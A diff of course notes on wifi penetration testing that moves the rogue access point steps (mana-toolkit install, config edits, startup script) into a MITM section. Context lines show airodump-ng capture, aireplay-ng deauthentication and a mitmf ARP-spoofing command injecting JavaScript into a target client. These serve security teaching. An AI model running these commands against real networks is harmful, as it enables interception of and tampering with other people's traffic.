@@ -45,14 +45,6 @@ Here are the commands that will be used in the course
   * `airodump-ng --channel <network channel> --bssid <network bssid> --write <file-name> wlan0mon`
 * Deauth Attacks
   * `aireplay-ng --deauth <num-of-packets> -a <network bssid> -c <target bssid> wlan0mon`
-* Create a fake access point
-  * You need to have internet connection and a wireless card to broadcast it.
-  * `apt install mana-toolkit`
-  * Edit the files bellow. Change the interface and the ssid. After change the upstream and the phy.
-  * `nano /etc/mana-toolkit/hostpad-mana.conf`
-  * `nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
-  * Start the network
-  * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 ## Crack WEP
 ### Busy Network
 * Start airodump-ng in the target network
@@ -139,3 +131,11 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
 ### Code Injection
 * Inject JS
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0 --inject --js-payload "alert('hello from hacker')"`
+### Fake Access Point (Honeypot) to become the MITM
+* You need to have internet connection and a wireless card to broadcast it.
+  * `apt install mana-toolkit`
+* Edit the files bellow. Change the interface and the ssid. After change the upstream and the phy.
+  * `nano /etc/mana-toolkit/hostpad-mana.conf`
+  * `nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
+* Start the network
+  * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
